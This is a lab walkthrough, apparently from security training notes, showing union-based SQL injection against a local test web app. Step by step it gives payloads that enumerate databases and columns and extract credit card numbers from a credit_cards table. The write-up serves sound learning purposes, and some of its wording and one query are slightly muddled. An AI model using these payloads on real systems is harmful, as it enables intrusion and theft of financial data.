# Pivoting with SQL injection

## Lab 10: SQL Injection - Pivoting with SQL injection

<figure><img src="../../.gitbook/assets/image (45) (1).png" alt=""><figcaption></figcaption></figure>

Go to User Lookup page [http://127.0.0.1/index.php?page=user-info.php](http://127.0.0.1/index.php?page=user-info.php)

We just know that there're 10 columns, than we can utilize UNION operator to do a Union-Based SQLi, and try multiple possible colum names regarding credit card such as: creditcard, credit\_card, etc..

Payload -> `' UNION SELECT 1,2,3,4,5,6,7,8,9,1 FROM <column_name> --`&#x20;

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

for 'creditcard' column name we've an error, then it's not the correct answer.

The right column name is: 'credit\_card': `' UNION SELECT 1,2,3,4,5,6,7,8,9,10 FROM credit_cards --`&#x20;

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Great, we can retrieve info about db type, and version (answer of lab 11) utilizing this query:

`' UNION SELECT 1, database(),version(),user(),5,6,7,8,9,10--`&#x20;

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

and discover all installed DBs using the following query:

`' UNION SELECT 1,schema_name,3,4,5,6,7,8,9,10 from INFORMATION_SCHEMA.SCHEMATA--`&#x20;

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Great, at this time we need to understand which db and table have credit\_cards as column:

' UNION SELECT 1,COLUMN\_NAME,TABLE\_NAME,4,5,6,7,8,9,10 TABLE\_SCHEMA FROM \<db\_name>.COLUMNS WHERE table\_name='credit\_cards'--

In this case the first one value 'information\_schema' is the db\_name:

' UNION SELECT 1,COLUMN\_NAME,TABLE\_NAME,4,5,6,7,8,9,10 TABLE\_SCHEMA FROM INFORMATION\_SCHEMA.COLUMNS WHERE table\_name='credit\_cards'--

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The results provide us more info about columns, in this case we need to know only the ccnumber:

`' UNION SELECT 1,ccid,ccnumber,4,5,6,7,8,9,10 FROM credit_cards--`&#x20;

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

and obtain the ccnumber (the last of photo) regarding our response!
